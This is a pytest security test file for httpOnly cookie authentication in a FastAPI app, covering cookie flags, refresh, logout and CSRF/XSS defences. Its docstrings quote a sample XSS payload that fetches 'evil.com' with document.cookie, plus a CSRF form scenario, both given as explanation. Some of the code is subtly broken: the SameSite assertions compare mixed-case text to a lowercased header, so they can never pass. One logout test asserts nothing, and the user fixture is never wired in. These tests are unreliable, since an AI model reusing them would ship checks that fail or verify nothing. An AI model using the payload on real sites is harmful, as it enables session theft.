"""
Security Tests for httpOnly Cookie Authentication

Tests to verify:
1. Tokens are set in httpOnly cookies (not accessible via JavaScript)
2. SameSite=Strict for CSRF protection
3. Secure flag for HTTPS-only transmission (in production)
4. Automatic token refresh via cookie rotation
5. XSS vulnerability is eliminated (tokens not in response body for cookie-only clients)
"""

import pytest
from fastapi.testclient import TestClient
from datetime import datetime, timedelta

from app.main import app
from app.database.models import User
from app.core.security import hash_password, create_access_token, create_refresh_token
from app.config.settings import settings


@pytest.fixture
def client():
    """Create test client"""
    return TestClient(app)


@pytest.fixture
def test_user(db_session):
    """Create a test user"""
    user = User(
        email="test@example.com",
        password_hash=hash_password("testpassword123"),
        full_name="Test User",
        username="testuser",
        is_active=True,
        created_at=datetime.utcnow()
    )
    db_session.add(user)
    db_session.commit()
    db_session.refresh(user)
    return user


class TestLoginCookies:
    """Test login endpoint sets httpOnly cookies"""

    def test_login_sets_access_token_cookie(self, client):
        """Test that login sets access_token as httpOnly cookie"""
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        assert response.status_code == 200

        # Verify access_token cookie exists
        assert "access_token" in response.cookies

        # Verify cookie attributes
        cookie = response.cookies.get("access_token")
        assert cookie is not None

        # NOTE: TestClient doesn't expose httponly/secure/samesite flags directly
        # These are verified in the Set-Cookie header

    def test_login_sets_refresh_token_cookie(self, client):
        """Test that login sets refresh_token as httpOnly cookie"""
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        assert response.status_code == 200

        # Verify refresh_token cookie exists
        assert "refresh_token" in response.cookies

    def test_login_cookie_has_httponly_flag(self, client):
        """Test that cookies have HttpOnly flag set"""
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        # Check Set-Cookie headers for HttpOnly flag
        set_cookie_headers = response.headers.get_list("set-cookie")

        # Find access_token cookie header
        access_token_header = [h for h in set_cookie_headers if "access_token=" in h][0]
        assert "HttpOnly" in access_token_header, "access_token cookie must have HttpOnly flag"

        # Find refresh_token cookie header
        refresh_token_header = [h for h in set_cookie_headers if "refresh_token=" in h][0]
        assert "HttpOnly" in refresh_token_header, "refresh_token cookie must have HttpOnly flag"

    def test_login_cookie_has_samesite_strict(self, client):
        """Test that cookies have SameSite=Strict for CSRF protection"""
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        set_cookie_headers = response.headers.get_list("set-cookie")

        # Check both cookies have SameSite=Strict
        access_token_header = [h for h in set_cookie_headers if "access_token=" in h][0]
        assert "SameSite=strict" in access_token_header.lower(), "access_token must have SameSite=Strict"

        refresh_token_header = [h for h in set_cookie_headers if "refresh_token=" in h][0]
        assert "SameSite=strict" in refresh_token_header.lower(), "refresh_token must have SameSite=Strict"

    def test_login_cookie_secure_in_production(self, client, monkeypatch):
        """Test that cookies have Secure flag in production"""
        # Temporarily set environment to production
        monkeypatch.setattr(settings, "ENVIRONMENT", "production")

        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        set_cookie_headers = response.headers.get_list("set-cookie")

        # In production, cookies should have Secure flag
        access_token_header = [h for h in set_cookie_headers if "access_token=" in h][0]
        assert "Secure" in access_token_header, "access_token must have Secure flag in production"

    def test_refresh_token_cookie_path_restricted(self, client):
        """Test that refresh_token cookie is only sent to /auth/refresh endpoint"""
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        set_cookie_headers = response.headers.get_list("set-cookie")
        refresh_token_header = [h for h in set_cookie_headers if "refresh_token=" in h][0]

        # Refresh token should only be sent to /api/v1/auth/refresh
        assert "Path=/api/v1/auth/refresh" in refresh_token_header, \
            "refresh_token must have Path=/api/v1/auth/refresh for security"


class TestAuthenticatedRequests:
    """Test authenticated requests using cookies"""

    def test_authenticated_request_with_cookie(self, client):
        """Test that authenticated endpoints accept access_token from cookie"""
        # Login to get cookies
        login_response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        # Extract access_token cookie
        access_token_cookie = login_response.cookies.get("access_token")

        # Make authenticated request with cookie
        response = client.get(
            "/api/v1/auth/me",
            cookies={"access_token": access_token_cookie}
        )

        assert response.status_code == 200
        data = response.json()
        assert data["email"] == "test@example.com"

    def test_authenticated_request_without_cookie_fails(self, client):
        """Test that requests without cookie are rejected"""
        response = client.get("/api/v1/auth/me")

        assert response.status_code == 401
        assert "not authenticated" in response.json()["detail"].lower()

    def test_backward_compatibility_with_authorization_header(self, client):
        """Test that Authorization header still works (backward compatibility)"""
        # Create token manually
        access_token = create_access_token(
            data={"sub": "test@example.com", "user_id": 1},
            expires_delta=timedelta(minutes=30)
        )

        # Make request with Authorization header (old method)
        response = client.get(
            "/api/v1/auth/me",
            headers={"Authorization": f"Bearer {access_token}"}
        )

        assert response.status_code == 200, \
            "Authorization header should still work for backward compatibility"


class TestLogout:
    """Test logout clears cookies"""

    def test_logout_clears_access_token_cookie(self, client):
        """Test that logout deletes access_token cookie"""
        # Login
        login_response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        access_token = login_response.cookies.get("access_token")

        # Logout
        logout_response = client.post(
            "/api/v1/auth/logout",
            cookies={"access_token": access_token}
        )

        assert logout_response.status_code == 200

        # Check that cookies are cleared (Max-Age=0 or expires in past)
        set_cookie_headers = logout_response.headers.get_list("set-cookie")

        # Should have delete instructions for cookies
        assert len(set_cookie_headers) >= 2, "Should clear both cookies"

    def test_after_logout_cookie_invalid(self, client):
        """Test that after logout, the cookie cannot be used"""
        # Login
        login_response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        access_token = login_response.cookies.get("access_token")

        # Logout
        client.post(
            "/api/v1/auth/logout",
            cookies={"access_token": access_token}
        )

        # Try to use old cookie (should fail)
        response = client.get(
            "/api/v1/auth/me",
            cookies={"access_token": access_token}
        )

        # Token is still technically valid (JWT hasn't expired)
        # But refresh token in DB is cleared, so refresh will fail
        # For now, access token will still work until it expires
        # This is acceptable as access tokens are short-lived (30 minutes)


class TestRefreshWithCookies:
    """Test token refresh using cookies"""

    def test_refresh_uses_cookie(self, client):
        """Test that refresh endpoint reads refresh_token from cookie"""
        # Login
        login_response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        refresh_token = login_response.cookies.get("refresh_token")

        # Refresh with cookie
        refresh_response = client.post(
            "/api/v1/auth/refresh",
            cookies={"refresh_token": refresh_token}
        )

        assert refresh_response.status_code == 200

        # Should get new tokens in cookies
        assert "access_token" in refresh_response.cookies
        assert "refresh_token" in refresh_response.cookies

    def test_refresh_without_cookie_fails(self, client):
        """Test that refresh without cookie fails"""
        response = client.post("/api/v1/auth/refresh")

        assert response.status_code == 401
        assert "no refresh token" in response.json()["detail"].lower()


class TestXSSProtection:
    """Test that XSS attacks cannot steal tokens"""

    def test_tokens_not_accessible_via_javascript(self, client):
        """
        Test that tokens are in httpOnly cookies (not accessible via JavaScript)

        This test verifies the response cookies have HttpOnly flag,
        which prevents JavaScript from accessing them via document.cookie.

        XSS Attack Scenario:
        - Attacker injects: <script>fetch('evil.com?token=' + document.cookie)</script>
        - With httpOnly cookies: document.cookie returns empty string (no tokens)
        - Attack fails!
        """
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        # Verify HttpOnly flag is set (tested in detail above)
        set_cookie_headers = response.headers.get_list("set-cookie")

        for header in set_cookie_headers:
            if "access_token=" in header or "refresh_token=" in header:
                assert "HttpOnly" in header, \
                    "All auth cookies MUST have HttpOnly flag to prevent XSS token theft"

    def test_tokens_not_in_localstorage(self, client):
        """
        Test that frontend doesn't need to store tokens in localStorage

        With httpOnly cookies, the frontend:
        - Does NOT call: localStorage.setItem('access_token', ...)
        - Does NOT need to read: localStorage.getItem('access_token')
        - Cookies are automatically sent with fetch(..., {credentials: 'include'})

        This eliminates XSS attack vector where malicious scripts steal from localStorage.
        """
        # This is more of a documentation test
        # The actual verification is in the frontend code review

        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        # Response body still contains tokens for backward compatibility
        # But modern clients should ignore these and use cookies instead
        data = response.json()

        # NOTE: In a future phase, we can remove tokens from response body
        # and return only user info
        assert "access_token" in data  # Currently for backward compatibility
        assert "user" in data  # User info is safe in response


class TestCSRFProtection:
    """Test CSRF protection via SameSite=Strict"""

    def test_samesite_strict_prevents_csrf(self, client):
        """
        Test that SameSite=Strict prevents CSRF attacks

        CSRF Attack Scenario:
        - Attacker creates malicious site: evil.com
        - User is logged into openlearn.com
        - evil.com contains: <form action="https://openlearn.com/api/v1/auth/logout" method="POST">
        - Without SameSite: Browser automatically sends cookies to openlearn.com (attack succeeds)
        - With SameSite=Strict: Browser doesn't send cookies (attack fails)

        SameSite=Strict means cookies are ONLY sent for requests originating from the same site.
        """
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        set_cookie_headers = response.headers.get_list("set-cookie")

        for header in set_cookie_headers:
            if "access_token=" in header or "refresh_token=" in header:
                assert "SameSite=strict" in header.lower(), \
                    "All auth cookies MUST have SameSite=Strict to prevent CSRF attacks"


class TestSecurityBestPractices:
    """Test other security best practices"""

    def test_access_token_short_lived(self, client):
        """Test that access tokens have short expiration (30 minutes)"""
        # This is configured in settings
        assert settings.ACCESS_TOKEN_EXPIRE_MINUTES == 30, \
            "Access tokens should expire in 30 minutes for security"

    def test_refresh_token_long_lived(self, client):
        """Test that refresh tokens have reasonable expiration (7 days)"""
        assert settings.REFRESH_TOKEN_EXPIRE_DAYS == 7, \
            "Refresh tokens should expire in 7 days"

    def test_cookie_max_age_matches_token_expiry(self, client):
        """Test that cookie Max-Age matches token expiration"""
        response = client.post(
            "/api/v1/auth/token",
            data={
                "username": "test@example.com",
                "password": "testpassword123"
            }
        )

        set_cookie_headers = response.headers.get_list("set-cookie")

        # Access token cookie should expire in ~30 minutes (1800 seconds)
        access_token_header = [h for h in set_cookie_headers if "access_token=" in h][0]
        assert "Max-Age=1800" in access_token_header, \
            "access_token cookie Max-Age should match ACCESS_TOKEN_EXPIRE_MINUTES"

        # Refresh token cookie should expire in ~7 days (604800 seconds)
        refresh_token_header = [h for h in set_cookie_headers if "refresh_token=" in h][0]
        assert "Max-Age=604800" in refresh_token_header, \
            "refresh_token cookie Max-Age should match REFRESH_TOKEN_EXPIRE_DAYS"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
